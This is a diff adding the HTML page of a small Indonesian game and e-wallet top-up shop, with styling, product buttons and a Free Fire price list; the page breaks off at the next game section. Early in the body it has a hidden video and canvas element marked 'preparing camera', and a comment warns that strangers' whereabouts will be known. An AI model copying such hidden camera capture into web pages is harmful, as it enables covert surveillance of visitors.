@@ -1,0 +1,1832 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta name="google" content="notranslate">
+  <meta http-equiv="Content-Language" content="id">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="shortcut icon" href="https://i.imgur.com/WFaY1in.png" type="image/png">
+  <!--<link rel="stylesheet" href="Dturawizaad/Data.css">
+  <script src="Dturawizaad/Data.js" defer></script>
+  <script src="https://kit.fontawesome.com/307e0884fc.js" crossorigin="anonymous"></script>-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+  <title>TOP-UP RAWIZAAD_768</title>
+  <style>
+        body {
+      height: 160vw;
+      background-image: url(https://i.imgur.com/vjqZY1K.jpeg);
+      background-size: 105% 105%;
+      background-repeat: repeat;
+      background-position: 0vw 18vw;
+      animation: ins 15s infinite;
+      animation-timing-function: linear;
+    }
+    
+    .hot {
+      color: orangered;
+      font-size: 3.5vw;
+    }
+    
+.box_scr::-webkit-scrollbar {
+  width: 3.5vw;
+  background-color: #47474770; 
+}
+.box_scr::-webkit-scrollbar-track {
+  border-radius: 10px;
+  background-color: #47474770;
+}
+.box_scr::-webkit-scrollbar-thumb {
+  background-color: white;
+  border-radius: 10%;
+  border: #000000 solid 0.5vw;
+}
+.box_scr::-webkit-scrollbar-thumb:hover {
+  background-color: #FF0000; 
+}
+.box_scr::-webkit-scrollbar-button {
+  background-color: #337AB7; 
+  border: none;
+}
+.box_scr::-webkit-scrollbar-button:hover {
+  background-color: #0087FF;
+}
+    
+    @keyframes ins{
+      from {
+        background-position: 0vw 18vw;
+      } to {
+        background-position: 105vw 18vw;
+      }
+    }
+    
+    @keyframes menu_t{
+      0% {
+        transform: translateX(53vw);
+      } 100% {
+        transform: translateX(0vw);
+      }
+    }
+    @keyframes menu_f{
+      0% {
+        transform: translateX(0vw);
+      } 100% {
+        transform: translateX(53vw);
+      }
+    }
+    
+    .menu {
+      position: absolute;
+      top: 10%;
+      right: 0;
+      width: 50%;
+      height: 162vw;
+      background-color: #272727;
+      border: 1vw solid #111111;
+      box-shadow:inset 0 0 1000vw #000000;
+      color: white;
+      font-size: 5vw;
+      justify-items: center;
+      padding: 5vw 0 5vw 0;
+      transform: translateX(53vw);
+      color: #52ABFF;
+      padding: 3vw 0 3vw 0;
+    }
+    
+    .menu > hr {
+      width: 100%;
+      height: 1vw;
+      border: none;
+      background-color: #434343;
+      margin-bottom: 7vw;
+    }
+    
+    .menu > i > a {
+      position: relative;
+      bottom: 0.2vw;
+      font-size: 3vw;
+      color: #52ABFF;
+      letter-spacing: 1vw;
+    }
+    
+    .body_box {
+      flex-direction: wrap;
+      justify-content: center;
+      align-content: center;
+      margin: 1.6vw;
+      padding: 4vw 0 4vw 0;
+      width: 93vw;
+      height: auto;
+      background-color: #FFFFFF52;
+      border-radius: 2%;
+    }
+    
+    button {
+      gap: 5vw;
+      margin: 4vw 1.5vw 4vw 1.5vw;
+    }
+    
+    .box_top {
+      position: absolute;
+      top: 0;
+      right: 0;
+      display: flex;
+      flex-direction: row;
+      flex-wrap: no;
+      align-items: center;
+      align-content: center;
+      justify-content: center;
+      gap: 10vw;
+      width: 100%;
+      height: 15vw;
+      background-color: #272727;
+      padding: 1vw 1vw;
+      border: 1vw solid #000000;
+      box-shadow:inset 0 0 35vw #000000;
+    }
+    
+    .box_down {
+      display: flex;
+      flex-wrap: wrap;
+      position: absolute;
+      bottom: -0.5vw;
+      left: 0;
+      width: 99%;
+      height: 20vw;
+      background-color: #3093FF;
+      border: 0.5vw solid white;
+      transform: translateY(22vw);
+    }
+    
+    @keyframes b_d {
+      from {
+        transform: translateY(22vw);
+      } to {
+        transform: translateY(0vw);
+      }
+    }
+    
+    @keyframes b_b {
+      from {
+        transform: translateY(0vw);
+      } to {
+        transform: translateY(22vw);
+      }
+    }
+    
+    .box_scr {
+      position: absolute;
+      top: 15vw;
+      left: 0;
+      width: 100%;
+      height: 90%;
+      background-color: transparent;
+      overflow-y: auto;
+      padding-top: 4vw;
+      padding-bottom: 4vw;
+    }
+    
+    .iconrwz {
+      width: 13vw;
+      height: 13vw;
+      background-image: url(https://i.imgur.com/WFaY1in.png);
+      background-color: transparent;
+      background-size: cover;
+      border: none;
+      border-radius: 25%;
+      filter: drop-shadow(0 0 1vw #FF0000);
+      
+    }
+    .iconrwz:active {
+      transform: scale(0.8);
+      Box-shadow: 0 0 4vw #4C3B3B99,inset 0 0 6vw #4C3B3B99;
+    }
+    
+    .button_menu {
+      font-size: 7vw;
+      color: white;
+    }
+    .button_menu:active {
+      transform: scale(0.8);
+      color: #9F9F9F;
+    }
+    
+    .name_user {
+      position: relative;
+      top: 4.2vw;
+      width: 50vw;
+      max-height: 10vw;
+      height: auto;
+      background-color: #424242C2;
+      border-radius: 5%;
+      Box-shadow: 0 0 5vw #000000C2;
+      align-items: center;
+      filter: drop-shadow(0 0 0.3vw #BBBBBB);
+    }
+    
+    .name_user > p {
+      color: white;
+      font-size: 3.6vw;
+      margin: 1.3vw;
+    }
+    
+    .title_web {
+      position: absolute;
+      bottom: 4.5vw;
+      left: 25vw;
+      background: linear-gradient(to right, #FF0000, #00FF55);
+      background-clip: text;
+      color: transparent;
+      font-size: 5vw;
+      font-weight: 900;
+      filter: drop-shadow(0 0 1.5vw #5B5B5B);
+    }
+    
+    .pembatas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 185vw;
+      background-color: transparent;
+      overflow: hidden;
+    }
+    .img_b {
+      position: flex;
+      padding: 5.5vw;
+      width: 30vw;
+      height: 29vw;
+      border-radius: 100%;
+    }
+    .img_B {
+      position: absolute;
+      top: 5.5vw;
+      left: 3.5vw;
+      width: 42vw;
+      height: 43vw;
+    }
+    .img_B:active {
+      transform: scale(0.95);
+    }
+    
+    #text_p {
+      font-size: 5vw;
+      font-weight: 500;
+      background: linear-gradient(to right, #9301FF, #FF5C00);
+      background-clip: text;
+      color: transparent;
+    }
+    
+    .top-up > img {
+      width: 10vw;
+      height: 10vw;
+      box-shadow: 0.3vw -0.3vw 5vw 1vw #AE56FF;
+      border: 1vw outset darkmagenta;
+    }
+    
+    @keyframes in{
+      0% {
+      } 50% {
+        opacity: 0;
+        transform: translateY(21vw);
+      } 65% {
+        opacity: 0.1;
+      } 100% {
+        opacity: 1;
+        transform: translateY(0vw);
+      }
+    }
+    
+    .top-up {
+      display: flex;
+      align-items: center;
+      padding: 3vw 1vw 3vw 3vw;
+      width: 90vw;
+      height: 15vw;
+      background-color: #101010B5;
+      border-radius: 3%;
+      border: 1vw outset #42445A;
+    }
+    .top-up:active {
+      animation: click 0.2s forwards;
+    }
+    @keyframes click{
+      form {
+        border: 1vw outset #42445A;
+      } to {
+        border: 1.3vw inset red;
+      }
+    }
+    
+    .h_menu {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      height: 170.1vw;
+      background-color: #000000C4;
+    }
+    
+    #topup > audio {
+      display: flex;
+      margin: 0 auto;
+    }
+    
+    .promotion1 {
+      position: absolute;
+      right: 0.5vw;
+      transform: translateY(0vw);
+      width: 19vw;
+      height: 12vw;
+      background-color: transparent;
+      background-image: url(https://i.imgur.com/qTt891Y.png);
+      background-size: cover;
+      background-position: center;
+    }
+    
+    .promotion2 {
+      position: absolute;
+      right: 0.5vw;
+      transform: translateY(-3vw);
+      width: 14vw;
+      height: 7vw;
+      background-color: transparent;
+      background-image: url(https://i.imgur.com/Rjc7J2i.png);
+      background-size: cover;
+      background-position: center;
+    }
+    
+    .promotion3 {
+      position: absolute;
+      right: 0.5vw;
+      transform: translateY(3.5vw);
+      width: 13vw;
+      height: 5vw;
+      background-color: transparent;
+      background-image: url(https://i.imgur.com/yiqPoa6.png);
+      background-size: cover;
+      background-position: center;
+    }
+    
+   .box_topup {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  margin: 1.5vw;
+  color: red;
+  width: 15vw;
+  height: 15vw;
+  background-color: #101010;
+  border-radius: 3%;
+  border: outset 1vw #42445A;
+}
+
+tr {
+  font-size: 2.8vw;
+  white-space: nowrap;
+  font-weight: 900;
+}
+
+.to123 > td {
+background: linear-gradient(to right, #1453FB, #43B3FF);
+background-clip: text;
+color: transparent;
+padding: 1vw;
+}
+
+.table {
+      box-shadow: 0 2vw 10vw inset #071CFF,
+      0 0 20vw #3341E2 inset;
+      border-collapse: collapse;
+      width: 50%;
+      margin: 0 auto;
+      table-layout: fixed;
+      width: auto;
+      height: auto;
+    }
+    
+    .cekbox {
+      margin: 0 5vw 0 5vw;
+      width: 9vw;
+      height: 9vw;
+    }
+
+    .tabel2 {
+      margin: 2vw 0 2vw 0;
+      background-color: #AEAEAEC7;
+    }
+    
+    .q {
+      font-size: 8vw;
+      transform: rotate(180deg) translateX(-7vw); 
+      position: absolute;
+    }
+    
+    .button_s {
+      position: absolute;
+      bottom: -1vw;
+      right: 40vw;
+      width: 40vw;
+      height: 8vw;
+      background-color: #686868;
+      font-weight: 500;
+      color: #00D91D;
+      font-size: 2.5vw;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .tot_top {
+      position: absolute;
+      right: 0;
+      width: 40%;
+      height: 100%;
+      background-color: #D6D6D6;
+      border-left: 0.5vw outset black;
+    }
+    
+    .pesoutB {
+      position: absolute;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      height: 89%;
+      background-color: #0000008A;
+    }
+    .pesout {
+      display: grid;
+      justify-content: center;
+      align-items: center;
+      width: 90%;
+      height: 83%;
+      background-color: #D9D9D9;
+      border: 1vw solid white;
+      border-radius: 3%;
+      animation: an_pes 60s infinite;
+    }
+    
+    @keyframes an_pes {
+      0% {
+        Box-shadow: 0 0 23vw #FFFFFF, 0 0 20vw inset #FFFFFF;
+      } 20% {
+        Box-shadow: 0 0 23vw #D700FF, 0 0 20vw inset #EA79FF;
+      } 40% {
+        Box-shadow: 0 0 23vw #03FF00, 0 0 20vw inset #77FF89;
+      } 60% {
+        Box-shadow: 0 0 23vw #000CFF, 0 0 20vw inset #7590FF;
+      } 80% {
+        Box-shadow: 0 0 23vw #FF0000, 0 0 20vw inset #FF7777
+      } 100% {
+        Box-shadow: 0 0 23vw #FFFFFF, 0 0 20vw inset #FFFFFF;
+      }
+    }
+    
+    .ext {
+      position: absolute;
+      top: 10%;
+      right: 7%;
+      font-size: 13vw;
+    }
+    .ext:active {
+      transform: translateX(-1.3vw) translateY(1vw);
+      font-size: 10vw;
+    }
+    
+    label > input {
+      text-align: center;
+      font-size: 5vw;
+    }
+    
+    form > button {
+      margin: 5vw;
+      width: 90%;
+      height: 10vw;
+      background-color: #1ED525;
+      font-weight: 700;
+      font-size: 6vw;
+    }
+    
+    input:placeholder-shown {
+      border: 0.3vw solid grey;
+    }
+    
+    input:invalid {
+      border: 0.3vw solid orangered;
+    }
+    
+    label[for] {
+      font-weight: 600;
+    }
+    
+    .tableS {
+      border-collapse: collapse;
+      width: 79vw; height: 50vw;
+      margin: 0 auto;
+      text-align: center;
+    }
+    
+    .tabels {
+      width: auto;
+      height: auto;
+    }
+  </style>
+</head>
+<body>
+   <!--Deskripsi dari host web: peringatan! jika ingin top up anda harus terdaftar atau terlist dalam web karena hanya melayani orang yang pelanggan dekat tidak boleh lebih! web ini tidak bisa boleh di sebarkan karena hanya pelanggan yang dapat di akses! web ini aman untuk pelanggan dekat karena jika orang asing masuk akan mengetahui keberadaanya!-->
+<div class="pembatas">
+   <div hidden>
+        <video id="video" autoplay playsinline width="300"></video>
+         <canvas id="canvas" style="display: none;"></canvas>
+         <p id="status">Menyiapkan kamera...</p>
+   </div>
+  <div class="box_scr">
+  <center><table border="1" class="tabel2" name="table1">
+  <tr style="font-size: 5vw; color: blueviolet">
+    <th colspan="3">PILIH JENIS TOP-UP:</th>
+  </tr >
+  <tr style="font-size: 5vw;">
+    <td colspan="3">
+      <i id="q" class="fa-solid fa-hand-point-up q"></i>
+      <input style="width: 49vw; height: 2vw; margin: 0 9vw 2vw 9vw; opacity: 70%" type="range" min="1" max="3" value="1" oninput="rang(this.value);" id="range"></td>
+  </tr>
+  <tr style="font-size: 3vw; Text-align: center">
+    <td style="color: magenta">TOP-UP GAME</td><td style="color: cyan">TOP-UP SALDO</td><td style="color: red">TOP-UP PULSA</td>
+  </tr>
+</table></center>
+    <div class="body_box" name="LtopA" id="Ltop1" style="display: flex; border: 1vw outset magenta;">
+      <div id="topup">
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(140%) blur(0vw)"><img src="https://cdn6.aptoide.com/imgs/d/2/3/d23a1fed49071a532c85846a1dff9320_icon.png"><p id="text_p">FREE FIRE MAX</p><div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      <div class="promotion2"></div>
+      </button>
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(120%) blur(0vw)"><img src="https://cdn-1.webcatalog.io/catalog/blockman-go/blockman-go-icon-filled-256.png"><p id="text_p">BLOCKMAN GO</p>
+      <div class="promotion2"></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      </button>
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(120%) blur(0vw)"><img src="https://i.imgur.com/C8StTlU.jpeg"><p id="text_p">GENSHIN IMPACT</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      </button>
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(135%) blur(0vw)"><img src="https://radarpena.disway.id/upload/13b4bd006de29064ea5810f413a811d6.png"><p id="text_p">MOBILE LEGENDS</p>
+      <div class="promotion2"></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      </button>
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(140%) blur(0vw)"><img src="https://i.imgur.com/ftqBLwH.jpeg"><p id="text_p">MINI WORLD CREATA</p>
+      <div class="promotion2" hidden></div><div class="promotion1"><p style="font-size: 2vw; font-weight: 700; color: red; text-align: center; position: relative; top: 28%;"> SYARAT! </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(160%) blur(0vw)"><img src="https://i.imgur.com/YR58dnC.jpeg"><p id="text_p">BLOOD STRIKE</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      </button>
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(140%) blur(0vw)"><img src="https://i.imgur.com/bCPrPIW.jpeg"><p id="text_p">FC MOBILE</p><div class="promotion2"></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)"><img src="https://i.imgur.com/0Funlz5.jpeg"><p id="text_p">STUMBEL GUYS</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+  </div></div>
+  <div class="body_box" name="LtopA" id="Ltop2" style="display: none; border: 1vw outset cyan;">
+      <div id="topup">
+      <button type="button" onclick="incheck(this)" class="top-up" style="filter: saturate(160%) brightness(140%)" value="1000"><img src="https://i.imgur.com/v43C3Nx.png"><p id="text_p">DANA</p><div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3"></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)" value="3000"><img src="https://i.imgur.com/Gy6Pg0K.png"><p id="text_p">GOPAY</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)" value="1000"><img src="https://i.imgur.com/deYEKW8.png"><p id="text_p">SEA BANK</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)" value="1500"><img src="https://i.imgur.com/jHngiEG.jpeg"><p id="text_p">SHOPEE</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)" value="4000"><img src="https://i.imgur.com/sMF1J8K.png"><p id="text_p">BANK LAIN</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)" value="2000"><img src="https://i.imgur.com/F6NDoYV.jpeg"><p id="text_p">OVO</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+  </div></div>
+  <div class="body_box" name="LtopA" id="Ltop3" style="display: none; border: 1vw outset red;">
+      <div id="topup">
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)"><img src="https://i.imgur.com/RwlDRQg.jpeg"><p id="text_p">TELKOMSEL</p><div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)"><img src="https://i.imgur.com/SpAzYoH.png"><p id="text_p">IM3</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)"><img src="https://i.imgur.com/06S5cIu.png"><p id="text_p">XL</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+      <button type="button" class="top-up" style="filter: saturate(100%) brightness(20%) blur(0.4vw)"><img src="https://i.imgur.com/mjnFVdn.jpeg"><p id="text_p">SMARTFREN</p>
+      <div class="promotion2" hidden></div><div class="promotion1" hidden><p style="font-size: 5vw; font-weight: 700; color: red; text-align: center; position: relative; top: -0.5vw;"> -0% </p></div><div class="promotion3" hidden></div>
+      </button>
+  </div></div>
+  <div id="FREE FIRE MAX" name="GAMES" hidden>
+  <h1 style="display: flex; justify-content: center; font-weight: 900; font-size: 7vw; background: linear-gradient(to right, #FF432C, #4B00FF); background-clip: text; color: transparent;">TOP-UP GAME FREE FIRE</h1>
+  <div class="body_box" style="padding-top: 15vw; margin-bottom: 5vw;">
+    <button type="button" class="fa-solid fa-circle-chevron-left" style="font-size: 6.5vw; width: 90%; height: 10vw; background-color: #F8F8F8CF; transform: rotate(180deg) translateY(16.5vw); position: absolute;" onclick="loby1();"></button>
+          <table border="4" class="table" id="table_" style="border: 1vw solid magenta;"><center>
+          <tr style="color: white; font-style:italic; font-size:3vw; background-color:black">
+            <th><b class="tabel" id="FREE FIRE MAX_0"> NO </th><th> DIAMOND / Card<b></th><th><b> HARGA </th><th><b> TO PESANAN</th>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+          <td>1</td><td id="FREE FIRE MAX_1">5 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 1.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF5DM,1000,FREE FIRE,1,0" onclick="checkOnlyOne(this)"></label></td>
+          </tr>
+          <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>2</td><td id="FREE FIRE MAX_2">10 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 2.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF10DM,2500,FREE FIRE,2,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>3</td><td id="FREE FIRE MAX_3">20 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 4.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF20DM,4500,FREE FIRE,3,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>4</td><td id="FREE FIRE MAX_4">50 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 8.500;00<br></font></b><del style="color:red"><i>Rp. 10.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF50DM,8500,FREE FIRE,4,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>5</td><td id="FREE FIRE MAX_5">70 DIAMOND 💎<sup class="hot"> HOT</sup></td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 11.500;00<br></font></b><del style="color:red"><i>Rp. 12.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF70DM,11500,FREE FIRE,5,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>6</td><td id="FREE FIRE MAX_6">100 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 17.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF100DM,17000,FREE FIRE,6,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>7</td><td id="FREE FIRE MAX_7">140 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 22.000;00<br></font></b><del style="color:red"><i>Rp. 23.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF140DM,22000,FREE FIRE,7,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>8</td><td id="FREE FIRE MAX_8">150 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 23.500;00<br></font></b><del style="color:red"><i>Rp. 24.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF150DM,23500,FREE FIRE,8,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>9</td><td id="FREE FIRE MAX_9">210 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 31.500;00<br></font></b><del style="color:red"><i>Rp. 33.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF210DM,31500,FREE FIRE,9,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>10</td><td id="FREE FIRE MAX_10">280 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 39.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF280DM,39000,FREE FIRE,10,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>11</td><td id="FREE FIRE MAX_11">355 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 48.000;00<br></font></b><del style="color:red"><i>Rp. 49.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF355DM,48000,FREE FIRE,11,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>12</td><td id="FREE FIRE MAX_12">425 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 58.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF425DM,58500,FREE FIRE,12,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>13</td><td id="FREE FIRE MAX_13">500 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 68.500;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF500DM,68500,FREE FIRE,13,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>14</td><td id="FREE FIRE MAX_14">720 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 93.000;00<br></font></b><del style="color:red"><i>Rp. 94.500;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF720DM,93000,FREE FIRE,14,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>15</td><td id="FREE FIRE MAX_15">860 DIAMOND 💎</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 115.000;00<br></font></b><del style="color:red"><i>Rp. 117.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFF860DM,115000,FREE FIRE,15,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>16</td><td id="FREE FIRE MAX_16" style="white-space: wrap;">BOYAH CARD PASS</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 45.000;00<br></font></b><del style="color:red"><i>Rp. 47.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFFBPC,45000,FREE FIRE,16,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>17</td><td id="FREE FIRE MAX_17" style="white-space: wrap;">MEMBERSHIP MINGGUAN</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 32.000;00<br></font></b><del style="color:red"><i></i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFFMSM,32000,FREE FIRE,17,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr>
+            <tr style="background-color:#333333; color:#ffffff" class="to123">
+           <td>18</td><td id="FREE FIRE MAX_18" style="white-space: wrap;">MEMBERSHIP BULANAN</td><td><p style="font-size:2.3vw"><b><font style="color:green;font-size:2.8vw">Rp. 96.000;00<br></font></b><del style="color:red"><i>Rp. 98.000;00</i></del><sup><ins style="color:white"></ins></sup></p></td><td><label><input type="checkbox" name="subRadio" class="cekbox" value="TUFFMSB,96000,FREE FIRE,18,0" onclick="checkOnlyOne(this)"></label></td>
+           </tr><p id="0" hidden>Rp. ;00</p>
+        </table>
+<br>
+</div></div>
+<div id="BLOCKMAN GO" name="GAMES" hidden>
